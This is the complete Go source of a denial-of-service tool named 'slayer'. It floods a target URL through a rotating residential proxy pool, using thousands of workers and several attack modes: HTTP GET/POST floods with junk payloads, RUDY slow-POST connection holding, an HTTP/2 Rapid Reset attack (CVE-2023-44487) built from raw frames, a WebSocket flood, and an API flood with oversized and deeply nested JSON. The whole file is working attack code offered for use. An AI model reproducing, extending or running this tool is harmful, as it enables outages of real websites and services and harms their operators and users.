package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

func loadProxies(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, fmt.Errorf("open proxy file: %w", err)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if line := scanner.Text(); line != "" {
			lines = append(lines, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("read proxy file: %w", err)
	}
	if len(lines) == 0 {
		return nil, fmt.Errorf("no proxies found in %s", filename)
	}
	return lines, nil
}

func buildClientPool(proxies []string) ([]*http.Client, error) {
	// Deduplicate — rotating proxies often use one gateway URL
	seen := make(map[string]bool)
	var unique []string
	for _, p := range proxies {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}

	// For each unique proxy, build a small cluster of clients so workers
	// spread across independent transport connection pools.
	const clientsPerProxy = 32
	clients := make([]*http.Client, 0, len(unique)*clientsPerProxy)

	for _, raw := range unique {
		proxyURL, err := url.Parse(raw)
		if err != nil {
			log.Printf("skipping bad proxy %s: %v", raw, err)
			continue
		}
		for i := 0; i < clientsPerProxy; i++ {
			c := &http.Client{
				Transport: &http.Transport{
					Proxy: http.ProxyURL(proxyURL),
					DialContext: (&net.Dialer{
						Timeout:   5 * time.Second,
						KeepAlive: 30 * time.Second,
					}).DialContext,
					TLSClientConfig: &tls.Config{
						InsecureSkipVerify: true,
						MinVersion:         tls.VersionTLS12,
					},
					TLSHandshakeTimeout:   5 * time.Second,
					MaxIdleConns:          500,
					MaxIdleConnsPerHost:   250,
					MaxConnsPerHost:       250,
					IdleConnTimeout:       90 * time.Second,
					ResponseHeaderTimeout: 10 * time.Second,
					DisableKeepAlives:     false,
					DisableCompression:    true,
					ForceAttemptHTTP2:     false,
				},
				Timeout: 10 * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					if len(via) >= 3 {
						return http.ErrUseLastResponse
					}
					return nil
				},
			}
			clients = append(clients, c)
		}
	}
	if len(clients) == 0 {
		return nil, fmt.Errorf("no valid proxy clients built")
	}
	return clients, nil
}

func httpGet(url string, client *http.Client) error {
	resp, err := client.Get(url)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

// ── Payload generators ──

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func randEmail() string {
	domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
	return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
}

func genFormPayload() (string, string) {
	payloads := []func() string{
		// Login form
		func() string {
			return "username=" + randString(8+rand.Intn(16)) +
				"&password=" + randString(12+rand.Intn(20)) +
				"&email=" + randEmail() +
				"&csrf_token=" + randString(32)
		},
		// Search form
		func() string {
			return "search=" + randString(20+rand.Intn(200)) +
				"&category=" + randString(5) +
				"&page=" + strconv.Itoa(rand.Intn(500)) +
				"&submit=Search"
		},
		// Comment / feedback form
		func() string {
			return "name=" + randString(10) +
				"&email=" + randEmail() +
				"&subject=" + randString(20+rand.Intn(40)) +
				"&message=" + randString(200+rand.Intn(2000)) +
				"&token=" + randString(64)
		},
		// Multi-param spam (hundreds of keys)
		func() string {
			var sb strings.Builder
			n := 50 + rand.Intn(200)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte('&')
				}
				sb.WriteString(randString(3 + rand.Intn(8)))
				sb.WriteByte('=')
				sb.WriteString(randString(5 + rand.Intn(30)))
			}
			return sb.String()
		},
		// Large random blob (10-50 KB base64 garbage)
		func() string {
			size := 10240 + rand.Intn(40960)
			blob := make([]byte, size)
			rand.Read(blob)
			return "data=" + base64.StdEncoding.EncodeToString(blob)
		},
	}

	// Occasionally send JSON instead
	if rand.Intn(4) == 0 {
		json := fmt.Sprintf(
			`{"email":"%s","password":"%s","action":"login","token":"%s","data":"%s"}`,
			randEmail(), randString(16+rand.Intn(32)), randString(64), randString(200+rand.Intn(1000)),
		)
		return json, "application/json"
	}

	return payloads[rand.Intn(len(payloads))](), "application/x-www-form-urlencoded"
}

func httpPost(targetURL string, client *http.Client) error {
	body, contentType := genFormPayload()
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Content-Length", strconv.Itoa(len(body)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

// ── RUDY (R U Dead Yet) — Slow POST ──

// slowReader drips bytes one at a time with a delay between each byte
type slowReader struct {
	data  []byte
	pos   int
	delay time.Duration
	stop  <-chan struct{}
}

func (r *slowReader) Read(p []byte) (int, error) {
	select {
	case <-r.stop:
		return 0, io.EOF
	default:
	}
	if r.pos >= len(r.data) {
		// Loop the payload to keep the connection open forever
		r.pos = 0
	}
	// Send 1 byte at a time
	p[0] = r.data[r.pos]
	r.pos++
	time.Sleep(r.delay)
	return 1, nil
}

func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error {
	// Declare a huge Content-Length to keep the server waiting
	declaredSize := 1024*1024 + rand.Intn(50*1024*1024) // 1-51 MB

	// Build a small payload chunk to drip slowly
	chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")

	slow := &slowReader{
		data:  chunk,
		delay: time.Duration(500+rand.Intn(2000)) * time.Millisecond, // 0.5-2.5s per byte
		stop:  stop,
	}

	req, err := http.NewRequest("POST", targetURL, slow)
	if err != nil {
		return err
	}
	req.ContentLength = int64(declaredSize)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")

	// Use a long-timeout client for RUDY — we WANT the connection to stay open
	rudyClient := *client
	rudyClient.Timeout = 0 // no timeout — drip until stopped
	if t, ok := rudyClient.Transport.(*http.Transport); ok {
		tClone := t.Clone()
		tClone.ResponseHeaderTimeout = 0
		tClone.IdleConnTimeout = 0
		rudyClient.Transport = tClone
	}

	resp, err := rudyClient.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

var totalSent atomic.Int64
var totalErrors atomic.Int64
var proxyList []string // set in main, used by rapid reset

// ── HTTP/2 Rapid Reset (CVE-2023-44487) ──

func httpRapidReset(targetURL string, stop <-chan struct{}) error {
	u, err := url.Parse(targetURL)
	if err != nil {
		return err
	}

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "443" // force TLS for h2
		}
	}
	addr := net.JoinHostPort(host, port)

	// Dial — through proxy CONNECT tunnel or direct
	var rawConn net.Conn
	if len(proxyList) > 0 {
		proxy := proxyList[rand.Intn(len(proxyList))]
		pURL, err := url.Parse(proxy)
		if err != nil {
			return err
		}
		rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
		if err != nil {
			return err
		}

		// Build CONNECT request
		connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if pURL.User != nil {
			user := pURL.User.Username()
			pass, _ := pURL.User.Password()
			cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
			connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
		}
		connectReq += "\r\n"

		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
			rawConn.Close()
			return err
		}

		br := bufio.NewReader(rawConn)
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			rawConn.Close()
			return fmt.Errorf("CONNECT failed: %w", err)
		}
		resp.Body.Close()
		if resp.StatusCode != 200 {
			rawConn.Close()
			return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
		}
	} else {
		rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
		if err != nil {
			return err
		}
	}

	// TLS handshake with ALPN h2
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName:         host,
		NextProtos:         []string{"h2"},
		InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()

	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}

	// HTTP/2 client connection preface
	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
		return err
	}

	// Buffered framer — batch frames before flushing to wire
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true

	// Send initial SETTINGS
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
	)
	bw.Flush()

	// Background reader — consume server frames so the connection doesn't stall
	connDone := make(chan struct{})
	go func() {
		defer close(connDone)
		for {
			f, err := framer.ReadFrame()
			if err != nil {
				return
			}
			switch sf := f.(type) {
			case *http2.SettingsFrame:
				if !sf.IsAck() {
					framer.WriteSettingsAck()
					bw.Flush()
				}
			case *http2.GoAwayFrame:
				return // server rejected us
			}
		}
	}()

	// HPACK encoder for pseudo-headers
	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}
	scheme := u.Scheme
	if scheme == "" || scheme == "http" {
		scheme = "https"
	}
	authority := u.Host

	var streamID uint32 = 1
	const batchSize = 100 // flush every 100 HEADERS+RST pairs

	for {
		select {
		case <-stop:
			return nil
		case <-connDone:
			return fmt.Errorf("connection closed by server")
		default:
		}

		for i := 0; i < batchSize; i++ {
			hdrBuf.Reset()
			enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
			enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
			enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
			enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
			enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: "Mozilla/5.0"})

			if err := framer.WriteHeaders(http2.HeadersFrameParam{
				StreamID:      streamID,
				BlockFragment: hdrBuf.Bytes(),
				EndStream:     true,
				EndHeaders:    true,
			}); err != nil {
				return err
			}

			if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
				return err
			}

			totalSent.Add(1)
			streamID += 2

			if streamID >= 1<<31-1 {
				bw.Flush()
				return nil // stream IDs exhausted — worker will reconnect
			}
		}
		bw.Flush()
	}
}

// ── WebSocket Flood ──

func wsFlood(targetURL string, stop <-chan struct{}) error {
	// Convert http(s) to ws(s)
	wsURL := targetURL
	if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + wsURL[7:]
	} else if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + wsURL[8:]
	} else if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
		wsURL = "ws://" + wsURL
	}

	// Proxy setup
	var proxyURL *url.URL
	if len(proxyList) > 0 {
		proxy := proxyList[rand.Intn(len(proxyList))]
		var err error
		proxyURL, err = url.Parse(proxy)
		if err != nil {
			return err
		}
	}

	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	if proxyURL != nil {
		dialer.Proxy = func(req *http.Request) (*url.URL, error) {
			return proxyURL, nil
		}
	}

	headers := http.Header{}
	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	headers.Set("Origin", targetURL)

	conn, _, err := dialer.Dial(wsURL, headers)
	if err != nil {
		return err
	}
	defer conn.Close()

	// Drain incoming messages in background so pongs are handled
	go func() {
		for {
			if _, _, err := conn.ReadMessage(); err != nil {
				return
			}
		}
	}()

	// Flood: mix of text messages, binary junk, and pings
	for {
		select {
		case <-stop:
			conn.WriteMessage(websocket.CloseMessage,
				websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			return nil
		default:
		}

		var err error
		switch rand.Intn(5) {
		case 0:
			// Text message — random JSON-like payload
			msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`,
				randString(8), randString(200+rand.Intn(2000)), time.Now().UnixNano())
			err = conn.WriteMessage(websocket.TextMessage, []byte(msg))
		case 1:
			// Binary junk — 1-8 KB
			data := make([]byte, 1024+rand.Intn(7168))
			rand.Read(data)
			err = conn.WriteMessage(websocket.BinaryMessage, data)
		case 2:
			// Ping flood
			err = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
		case 3:
			// Large text — 10-50 KB of garbage
			err = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.Intn(40960))))
		case 4:
			// Rapid small messages — burst 10 tiny frames
			for j := 0; j < 10; j++ {
				if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
					err = e
					break
				}
				totalSent.Add(1)
			}
		}

		if err != nil {
			return err // connection died — Worker will reconnect
		}
		totalSent.Add(1)
	}
}

// ── API/JSON POST Flood ──

var apiActions = []string{"update_profile", "create_post", "send_message", "add_comment", "upload_data", "sync", "process", "validate", "register", "checkout"}
var apiEndpoints = []string{"/api/v1/users", "/api/v2/data", "/api/graphql", "/api/v1/submit", "/api/v1/auth", "/api/v1/search", "/api/v1/events", "/api/v1/webhook"}

func genAPIPayload() string {
	generators := []func() string{
		// Profile update with huge bio
		func() string {
			bioLen := 2000 + rand.Intn(8000)
			return fmt.Sprintf(
				`{"user_id":"%d","action":"%s","bio":"%s","nonce":"%s","email":"%s","display_name":"%s"}`,
				rand.Intn(9999999), apiActions[rand.Intn(len(apiActions))],
				randString(bioLen), randString(32), randEmail(), randString(12+rand.Intn(20)),
			)
		},
		// Massive items array (500-5000 objects)
		func() string {
			var sb strings.Builder
			n := 500 + rand.Intn(4500)
			sb.WriteString(`{"action":"bulk_insert","token":"`)
			sb.WriteString(randString(64))
			sb.WriteString(`","items":[`)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte(',')
				}
				fmt.Fprintf(&sb, `{"id":%d,"name":"%s","value":"%s"}`,
					rand.Intn(9999999), randString(8+rand.Intn(16)), randString(20+rand.Intn(100)))
			}
			sb.WriteString(`]}`)
			return sb.String()
		},
		// Deeply nested JSON
		func() string {
			depth := 20 + rand.Intn(30)
			var sb strings.Builder
			for i := 0; i < depth; i++ {
				fmt.Fprintf(&sb, `{"level_%d":{"data":"%s","nested":`, i, randString(50+rand.Intn(200)))
			}
			sb.WriteString(`{"end":true}`)
			for i := 0; i < depth; i++ {
				sb.WriteString(`}}`)
			}
			return sb.String()
		},
		// GraphQL-style query with large variables
		func() string {
			return fmt.Sprintf(
				`{"query":"mutation { updateUser(input: $input) { id status } }","variables":{"input":{"id":"%d","name":"%s","bio":"%s","settings":{"theme":"%s","lang":"%s","notifications":%t,"data":"%s"}}}}`,
				rand.Intn(9999999), randString(16), randString(3000+rand.Intn(5000)),
				randString(8), randString(5), rand.Intn(2) == 1, randString(1000+rand.Intn(4000)),
			)
		},
		// Auth/login brute-force style
		func() string {
			return fmt.Sprintf(
				`{"email":"%s","password":"%s","mfa_code":"%06d","device_id":"%s","fingerprint":"%s"}`,
				randEmail(), randString(16+rand.Intn(32)), rand.Intn(999999),
				randString(36), randString(64),
			)
		},
		// Search/filter with many params
		func() string {
			var sb strings.Builder
			sb.WriteString(`{"action":"search","filters":{`)
			n := 20 + rand.Intn(50)
			for i := 0; i < n; i++ {
				if i > 0 {
					sb.WriteByte(',')
				}
				fmt.Fprintf(&sb, `"%s":"%s"`, randString(5+rand.Intn(10)), randString(10+rand.Intn(100)))
			}
			sb.WriteString(fmt.Sprintf(`},"page":%d,"limit":%d,"sort":"%s"}`,
				rand.Intn(10000), 100+rand.Intn(900), randString(8)))
			return sb.String()
		},
	}
	return generators[rand.Intn(len(generators))]()
}

func httpAPIFlood(targetURL string, client *http.Client) error {
	body := genAPIPayload()

	// Randomly append an API-like path
	fullURL := targetURL + apiEndpoints[rand.Intn(len(apiEndpoints))]

	req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Content-Length", strconv.Itoa(len(body)))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Request-ID", randString(32))
	req.Header.Set("Authorization", "Bearer "+randString(64))
	req.Header.Set("Origin", targetURL)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return nil
}

func Worker(targetURL string, method string, clients []*http.Client, stop <-chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
		}

		client := clients[rand.Intn(len(clients))]

		var err error
		switch strings.ToLower(method) {
		case "httpget":
			err = httpGet(targetURL, client)
		case "httppost":
			err = httpPost(targetURL, client)
		case "rudy":
			// RUDY holds the connection open — one connection per call
			err = httpRudy(targetURL, client, stop)
		case "apiflood":
			err = httpAPIFlood(targetURL, client)
		case "rapidreset":
			// Raw HTTP/2 — bypasses http.Client entirely
			err = httpRapidReset(targetURL, stop)
		case "wsflood":
			// WebSocket connection + message flood
			err = wsFlood(targetURL, stop)
		}

		if err != nil {
			totalErrors.Add(1)
			continue
		}
		totalSent.Add(1)
	}
}
func main() {
	target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
	method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood")
	workerCount := flag.Int("w", 2048, "number of workers")
	dur := flag.Int("d", 30, "duration in seconds")
	pFile := flag.String("p", "resi.txt", "proxy file path")
	flag.Parse()

	if *target == "" {
		fmt.Println(`
  ______   __                                                 ______                       
 /      \ |  \                                               /      \                      
|  $$$$$$\| $$  ______   __    __   ______    ______        |  $$$$$$\ __     __  _______  
| $$___\$$| $$ |      \ |  \  |  \ /      \  /      \       | $$___\$$|  \   /  \|       \ 
 \$$    \ | $$  \$$$$$$\| $$  | $$|  $$$$$$\|  $$$$$$\       \$$    \  \$$\ /  $$| $$$$$$$\
 _\$$$$$$\| $$ /      $$| $$  | $$| $$    $$| $$   \$$       _\$$$$$$\  \$$\  $$ | $$  | $$
|  \__| $$| $$|  $$$$$$$| $$__/ $$| $$$$$$$$| $$            |  \__| $$   \$$ $$  | $$  | $$
 \$$    $$| $$ \$$    $$ \$$    $$ \$$     \| $$             \$$    $$    \$$$   | $$  | $$
  \$$$$$$  \$$  \$$$$$$$ _\$$$$$$$  \$$$$$$$ \$$              \$$$$$$      \$     \$$   \$$
                        |  \__| $$                                                         
                         \$$    $$                                                         
                          \$$$$$$`)
		fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
		fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood")
		fmt.Println()
		flag.PrintDefaults()
		os.Exit(1)
	}

	targetURL := *target
	workers := *workerCount
	duration := *dur
	proxyFile := *pFile

	fmt.Println()
	fmt.Println("  ┌─────────────────────────────────────┐")
	fmt.Printf("  │ Target:   %-26s │\n", targetURL)
	fmt.Printf("  │ Method:   %-26s │\n", *method)
	fmt.Printf("  │ Workers:  %-26d │\n", workers)
	fmt.Printf("  │ Duration: %-24s │\n", fmt.Sprintf("%ds", duration))
	fmt.Printf("  │ Proxies:  %-26s │\n", proxyFile)
	fmt.Println("  └─────────────────────────────────────┘")
	fmt.Println()

	// Load proxies once, build reusable client pool
	proxies, err := loadProxies(proxyFile)
	if err != nil {
		log.Fatalf("failed to load proxies: %v", err)
	}
	fmt.Printf("  Loaded %d proxies\n", len(proxies))
	proxyList = proxies // expose for rapid reset raw dialing

	clients, err := buildClientPool(proxies)
	if err != nil {
		log.Fatalf("failed to build client pool: %v", err)
	}
	fmt.Printf("  Built %d proxy clients\n\n", len(clients))

	stop := make(chan struct{})

	for i := 0; i < workers; i++ {
		go Worker(targetURL, *method, clients, stop)
	}

	fmt.Printf("  Launched %d workers for %d seconds\n", workers, duration)

	// Live stats ticker
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	start := time.Now()

	go func() {
		for range ticker.C {
			elapsed := time.Since(start).Seconds()
			sent := totalSent.Load()
			errs := totalErrors.Load()
			rps := float64(sent) / elapsed
			fmt.Printf("\r  [%.0fs] Sent: %d | Errors: %d | RPS: %.0f   ", elapsed, sent, errs, rps)
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)

	sent := totalSent.Load()
	errs := totalErrors.Load()
	fmt.Printf("\n  Finished — Total sent: %d | Errors: %d | Avg RPS: %.0f\n", sent, errs, float64(sent)/float64(duration))
}
